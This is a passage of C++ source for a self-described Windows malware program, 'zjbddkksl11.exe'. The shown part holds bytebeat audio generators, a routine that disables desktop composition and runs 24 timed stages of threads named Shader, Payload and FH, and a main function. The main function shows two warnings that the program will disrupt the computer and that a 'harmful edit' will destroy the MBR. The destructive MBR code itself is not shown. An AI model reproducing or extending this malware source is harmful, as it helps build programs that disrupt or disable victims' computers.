    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & t + t / 256) + (t % ((t >> 12 & t) ? (t >> 12 & t) : 1)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((((t >> 10 | 4) % 32 >> 1) - ((t >> 9 & 44) % 32 >> 1)) * (16 > t % 8192 ? 1 : 4 / 5) * t | t >> 3) * (t & t >> 8 & t >> 6));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound21() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (int)(1 + t / (double)(t >> 8 & t >> 6)) & 127);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound22() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 | t) | t ^ 6 - 3 * t + (t >> 4 | t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound23() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 5 & t) | t * (5 & 7 >> t) | t & (t >> 6 | 2) ^ t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound24() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t * rand() * (t >> 5)) & t) - t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void SPtime() {
    Sleep(30000);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void stopThread(HANDLE hnd) {
    TerminateThread(hnd, 0);
    CloseHandle(hnd);
}
void runSP() {
    DwmEnableComposition(0);
    HANDLE th0 = CreateThread(NULL, 0, Window0, NULL, 0, NULL);
    sound1();
    HANDLE sh1 = CreateThread(NULL, 0, Shader1, NULL, 0, NULL);
    HANDLE fh1 = CreateThread(NULL, 0, FH6, NULL, 0, NULL);
    SPtime();
    stopThread(sh1);
    clean();
    sound2();
    HANDLE sh2 = CreateThread(NULL, 0, Shader2, NULL, 0, NULL);
    SPtime();
    stopThread(sh2);
    clean();
    sound3();
    HANDLE sh3 = CreateThread(NULL, 0, Shader3, NULL, 0, NULL);
    HANDLE fth3 = CreateThread(NULL, 0, FH2, NULL, 0, NULL);
    HANDLE fh2 = CreateThread(NULL, 0, FH5, NULL, 0, NULL);
    HANDLE fh3 = CreateThread(NULL, 0, FH7, NULL, 0, NULL);
    SPtime();
    stopThread(sh3);
    stopThread(fth3);
    clean();
    sound4();
    HANDLE sh4 = CreateThread(NULL, 0, Shader4, NULL, 0, NULL);
    SPtime();
    stopThread(sh4);
    clean();
    sound5();
    HANDLE sh5 = CreateThread(NULL, 0, Shader5, NULL, 0, NULL);
    SPtime();
    stopThread(sh5);
    clean();
    sound6();
    HANDLE sh6 = CreateThread(NULL, 0, Shader6, NULL, 0, NULL);
    HANDLE py6 = CreateThread(NULL, 0, Payload6, NULL, 0, NULL);
    SPtime();
    stopThread(sh6);
    stopThread(py6);
    clean();
    sound7();
    HANDLE sh7 = CreateThread(NULL, 0, Shader7, NULL, 0, NULL);
    HANDLE fh4 = CreateThread(NULL, 0, FH1, NULL, 0, NULL);
    SPtime();
    stopThread(sh7);
    clean();
    sound8();
    HANDLE sh8 = CreateThread(NULL, 0, Shader8, NULL, 0, NULL);
    HANDLE py8 = CreateThread(NULL, 0, Payload8, NULL, 0, NULL);
    SPtime();
    stopThread(sh8);
    stopThread(py8);
    clean();
    sound9();
    HANDLE sh9 = CreateThread(NULL, 0, Shader9, NULL, 0, NULL);
    SPtime();
    stopThread(sh9);
    clean();
    sound10();
    HANDLE sh10 = CreateThread(NULL, 0, Shader10, NULL, 0, NULL);
    HANDLE fh5 = CreateThread(NULL, 0, FH4, NULL, 0, NULL);
    SPtime();
    stopThread(sh10);
    clean();
    sound11();
    HANDLE sh11 = CreateThread(NULL, 0, Shader11, NULL, 0, NULL);
    HANDLE fh6 = CreateThread(NULL, 0, FH3, NULL, 0, NULL);
    SPtime();
    stopThread(sh11);
    clean();
    sound12();
    HANDLE sh12 = CreateThread(NULL, 0, Shader12, NULL, 0, NULL);
    SPtime();
    stopThread(sh12);
    clean();
    sound13();
    HANDLE sh13 = CreateThread(NULL, 0, Shader13, NULL, 0, NULL);
    SPtime();
    stopThread(sh13);
    clean();
    sound14();
    HANDLE sh14 = CreateThread(NULL, 0, Shader14, NULL, 0, NULL);
    SPtime();
    stopThread(sh14);
    clean();
    sound15();
    HANDLE sh15 = CreateThread(NULL, 0, Shader15, NULL, 0, NULL);
    SPtime();
    stopThread(sh15);
    clean();
    sound16();
    HANDLE sh16 = CreateThread(NULL, 0, Shader16, NULL, 0, NULL);
    SPtime();
    stopThread(sh16);
    clean();
    sound17();
    HANDLE sh17 = CreateThread(NULL, 0, Shader17, NULL, 0, NULL);
    SPtime();
    stopThread(sh17);
    clean();
    sound18();
    HANDLE sh18 = CreateThread(NULL, 0, Shader18, NULL, 0, NULL);
    SPtime();
    stopThread(sh18);
    clean();
    sound19();
    HANDLE sh19 = CreateThread(NULL, 0, Shader19, NULL, 0, NULL);
    SPtime();
    stopThread(sh19);
    clean();
    sound20();
    HANDLE sh20 = CreateThread(NULL, 0, Shader20, NULL, 0, NULL);
    SPtime();
    stopThread(sh20);
    clean();
    sound21();
    HANDLE sh21 = CreateThread(NULL, 0, Shader21, NULL, 0, NULL);
    SPtime();
    stopThread(sh21);
    clean();
    sound22();
    HANDLE sh22 = CreateThread(NULL, 0, Shader22, NULL, 0, NULL);
    SPtime();
    stopThread(sh22);
    clean();
    sound23();
    HANDLE sh23 = CreateThread(NULL, 0, Shader23, NULL, 0, NULL);
    SPtime();
    stopThread(sh23);
    clean();
    sound24();
    HANDLE sh24 = CreateThread(NULL, 0, Shader24, NULL, 0, NULL);
    SPtime();
    stopThread(sh24);
    stopThread(fh1);
    stopThread(fh2);
    stopThread(fh3);
    stopThread(fh4);
    stopThread(fh5);
    stopThread(fh6);
    clean();
    stopThread(th0);
}
int main() {
    SetProcessDPIAware();
    srand(time(NULL));
    FreeConsole();
    if (MessageBoxW(0, L"Warning!!!\n\nYou Just run a malware!!I will make your computer cannot work normally!Do you want to run me?Especially you're running my harmfull edit,my harmfull edit will break the MBR,and you cannot open you computer!If you just for a test,you could use a useless computer or a virtual computer.If you run me on a public computer or an important computer wich isn't your,my writer has no responsible.You shouldn't copy my code without asking my writer,you maybe can g0d1e(write for n17pro3426)\n\nClick [Yes] to run.\nClick [No] to exit.", L"zjbddkksl11.exe - Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        if (MessageBoxW(0, L"Last Warning!!!\n\nYou still want to run me?huh??I will make your computer cannot work normally!!Before you run me,check your operating environment.My writer has no responsible!!And if you click [Yes],I will start to break this computer because this is last warning.You should click [No] to exit if you're not for a test.", L"zjbddkksl11.exe - Last warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
        else {
            runSP();
        }
    }
    return 0;
}